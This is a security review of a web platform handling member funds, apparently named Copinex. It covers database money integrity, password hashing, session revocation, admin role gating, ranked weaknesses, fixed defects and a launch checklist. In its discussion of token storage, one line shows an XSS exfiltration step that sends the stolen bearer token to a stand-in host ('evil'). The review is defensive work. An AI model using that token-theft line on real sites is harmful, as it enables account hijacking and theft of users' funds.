# Copinex — Security Review

Honest assessment of the posture as shipped, written against the code rather
than the plan. Ordered by what would actually hurt if it were wrong.

Reviewed: 2026-09-27. Scope: `apps/api`, `apps/web`, `database/`,
`infrastructure/`.

---

## 1. What is genuinely solid

**Money integrity is enforced by the database, not the application.**
Wallet balances, pool balances and share columns carry `CHECK` constraints, and
a trigger in migration `0002` rejects any movement that would drive a balance
negative. Every movement writes an append-only `ledger_entries` row carrying
`balance_after`. A bug in a service therefore cannot mint money — it can only
fail loudly. Every FK is `NO ACTION`, so a user can never be deleted out from
under a financial record.

**Money is integer cents end to end.** No floats anywhere in the money path,
so there are no rounding drifts to reconcile. The `45+30+10+8+7 = 100` fee
split and the `60+10+30 = 100` profit split are asserted as tests.

**Passwords.** scrypt (`node:crypto`), 16-byte random salt, 64-byte key,
constant-time compare via `timingSafeEqual`, scheme-prefixed storage
(`scrypt$salt$hash`) so the algorithm can be upgraded without a flag day.

**Sessions are revocable.** Every token carries a `jti` and a `sessions` row
holding `sha256(token)`. `requireAuth` rejects revoked sessions on every request,
so logout is immediate rather than "when the JWT happens to expire". Session
rows record ip + user agent + last-seen, and a member can revoke individual
devices.

**Credential changes now close the door behind them.** A password reset
revokes *every* session for that account — including any an attacker is holding
— and a password change revokes every *other* device while keeping the caller's
own session alive. (Both were defects; both are fixed and covered by tests.)

**Email tokens are single-use, hashed at rest, and time-boxed.** Only
`sha256(token)` is stored; the plaintext exists solely inside the email link.
Verification is 24h, reset is 1h, a consumed token cannot be replayed, and
issuing a new reset link retires the previous one. A leaked older email stops
working the moment the member requests a fresh link.

**Account enumeration is blocked.** `forgot-password` returns
`{ ok: true }` for unknown addresses, identical to the known-address response.

**Staff authority is gated by a SUPERADMIN tier (added 2026-09-27).** Before
migration `0009` the `user_role` enum held only `MEMBER | ADMIN`, and
`roleHasPermission` returned `true` for anything an ADMIN asked for. That made
staff authority self-service: any ADMIN could `PATCH /admin/members/:id` with
`role=ADMIN` and mint unlimited peers, or suspend a fellow admin, with no second
pair of eyes. `SUPERADMIN` now sits above ADMIN and is the only role that can
grant, change, or revoke a role or touch a staff account; the
`SUPERADMIN_ONLY_PERMISSIONS` list keeps the `roleHasPermission` short-circuit
from leaking the new permission back to ADMIN. A role change also revokes the
target's sessions — the JWT carries the role, so without revocation a demoted
admin could keep minting admins for the remaining 7 days of the token and the
gate would be decorative. Covered by `tests/role-authority.integration.test.ts`
(10 cases).

**Admin cannot demote, disable or suspend their own account** — the API
returns 400 rather than letting the last admin (or last superadmin) strand
themselves.

**Every mutating admin action is audited**, written after the action succeeds so
the log reflects reality rather than intent. The audit write is deliberately
fail-open (a broken audit insert must never block a money action) but it fails
*loudly* to the error log.

**Production refuses to start insecure.** The env guard rejects dev placeholder
secrets and mock payment mode, and throws if `SMTP_URL` is missing — a platform
where password reset silently does nothing is worse than one that will not boot.

**Webhook forgery protection.** The Pay2Crypto callback is secret-gated, is
idempotent, and verifies reference and amount before crediting anything.

---

## 2. Known weaknesses, ranked

### High — fix before real balances

**a. The bearer token lives in `localStorage`, and the CSP does not stop XSS
from stealing it.** The web CSP is
`script-src 'self' 'unsafe-inline'` (required by Next.js hydration without a
nonce middleware). `'unsafe-inline'` in `script-src` means an injected inline
script *will* execute. `connect-src 'self'` blocks `fetch`/XHR exfiltration and
`img-src 'self' data:` blocks image beacons, but CSP does not restrict
navigation — an attacker can simply `location.href = 'https://evil/' + token`.
So the current CSP raises the bar but does not close the hole. The earlier
claim in `DEPLOYMENT.md` that the token is "mitigated by CSP" is overstated.

Fix, in order of value: move to an **httpOnly, SameSite=Strict cookie** with
CSRF protection (removes the token from JS entirely), then add **nonce-based
CSP** so `unsafe-inline` can be dropped from `script-src`.

**b. No second factor on the admin console.** A single password protects
`/admin/*` — member search, manual USDT approvals, pool settlement recording,
settings. This is the highest-value target on the platform. At minimum, TOTP
2FA on ADMIN accounts, enforced server-side, with recovery codes.

**c. No account lockout or credential-stuffing defence.** The auth limiter is
20 requests / 15 min per IP, which is a speed bump against one IP and nothing
against a botnet. There is no per-account failure counter, no lockout, and no
progressive delay. Recommendation: track failed logins per account, back off
exponentially, and alert on a spike.

**d. `trust proxy` is not set.** Behind a reverse proxy, `req.ip` resolves to
the proxy, which means (i) every member shares one rate-limit bucket, and
(ii) every audit row records the proxy IP instead of the real client. Set
`app.set('trust proxy', 1)` when TLS terminates upstream — this is already on
the pre-launch checklist in `DEPLOYMENT.md`, and it is a genuine blocker, not
a nicety.

### Medium

**e. Rate limiting is in-memory.** Limits reset on restart and are per-instance.
Fine for the single-instance pilot; a multi-instance deployment needs a shared
store (Redis is already provisioned for this).

**f. scrypt cost is node's default (N=16384).** OWASP's current guidance is
N=2^17 with r=8. Raising it makes offline cracking of a leaked hash far more
expensive. Note the trade-off: `scryptSync` blocks the event loop for the
duration, so a cost increase wants `scryptAsync`.

**g. The JWT algorithm is not pinned.** `jwt.verify` is called without an
`algorithms` allow-list. With a symmetric secret the practical risk is low, but
pinning `algorithms: ['HS256']` removes the question entirely.

**h. JWTs cannot be revoked before logout.** Logout works; a stolen token used
before its owner logs out works. Session revocation narrows the window but does
not eliminate it. A short access token plus a rotating refresh token is the
structural fix.

**i. Dev mail logs message bodies.** `[dev-mail]` logs the full text, which
contains the reset/verify token. This is unreachable in production (a transport
exists, so the branch is not taken, and its absence throws at boot), but it
means dev logs must never be shared or shipped anywhere.

### Low / accepted

- Broker PAMM links are placeholders until replaced; flagged by the cleanup script.
- `bonus_payloads.compressed` is vestigial and always false.
- Jobs (`/api/jobs/*`) are admin-triggered and not yet scheduled — they must not
  be exposed publicly.
- No secrets manager: secrets live in `platform/.env`. Acceptable for a
  single-host pilot; move to DPAPI/Key Vault/vault before multi-host.
- TLS termination is external (nginx/Caddy/load balancer), so HSTS is only as
  good as that layer. The API does send HSTS via helmet.

---

## 3. Defects found and fixed in this review

| Defect | Impact | Fix |
|---|---|---|
| Password reset did not revoke sessions | A stolen token survived a reset for the remainder of its 7-day life — the exact scenario a reset exists for | `revokeAllSessions()` on reset; `sessionsRevoked` returned |
| Password change did not revoke other devices | A compromised device stayed signed in after the owner changed the password | Revoke all except the caller's token |
| A new reset request did not retire the old link | A leaked earlier email stayed valid for its full 1h TTL | Retire outstanding reset tokens on issue |
| `PUT/DELETE /admin/settings/:key` passed the setting key as `targetId` into a uuid column | The audit insert failed every time, so **settings changes were silently unaudited** (fail-open + logged error) | `targetId: null`, key moved into `details` |
| Vitest global setup resolved the workspace root one level too high | The suite only passed when pnpm's environment happened to paper over it; a direct `vitest` run failed in global setup | Walk up to `pnpm-workspace.yaml` |
| `pre-pilot-cleanup.ps1` assumed CASCADE | The go-live cleanup step in the runbook would fail with an FK violation | Explicit dependency-ordered deletes; refuses to delete accounts carrying money/audit history |
| The service supervisor invoked bare `node` | Under a SYSTEM scheduled task (minimal PATH) the headless services would fail to start with nothing in the log | Resolve Node to an absolute path, fail loudly if absent |

All are covered by tests: `apps/api/tests/auth-security.integration.test.ts`
(19 cases), `apps/api/tests/role-authority.integration.test.ts` (10 cases) plus
the existing 146.

### The trap that nearly shipped a fake security control

`pnpm -r test` is **not** evidence that the running service has your fix. Vitest
compiles from `src/`; the supervisor runs `node dist/index.js`. While adding the
SUPERADMIN gate, all 10 new tests passed while the live API still had **no gate
at all** — the live check showed an ADMIN successfully granting ADMIN and the
SUPERADMIN locked out of the console, both symptoms of the pre-change build.

`tsc --noEmit` does not help either: it typechecks without emitting. Only
`pnpm --filter @copinex/api build` refreshes `dist/`.

**Before trusting any live behaviour: build, restart, then verify against the
service.** Treat "tests green" as a statement about source, never about the
running process.

---

## 4. Not covered — say this out loud before launch

- **No penetration test.** Everything above is source review plus automated
  tests. An external pen test of the auth, admin and money paths is the single
  best pre-launch spend.
- **No load or abuse testing.** No evidence the platform holds up under real
  traffic, and `scryptSync` blocking the event loop is unmeasured under load.
- **No dependency audit in CI.** `pnpm audit` is not enforced anywhere.
- **No alerting.** Audit entries and error logs exist, but nothing pages a human
  when a withdrawal is approved at 3am or when the auth error rate spikes.
- **No incident response or key-rotation procedure.** If `JWT_SECRET` leaks,
  there is no documented rotation path — and rotating it invalidates every
  session by design.

---

## 5. Launch gate

Do not take real member funds until: (a) admin 2FA, (b) httpOnly cookie auth
or at minimum nonce CSP, (c) `trust proxy` configured behind the real proxy,
(d) SMTP + SPF/DKIM verified end to end, (e) Pay2Crypto merchant token live,
(f) placeholder broker links replaced, (g) an external pen test done,
(h) the two tainted dev accounts resolved and the headless tasks running as
SYSTEM.
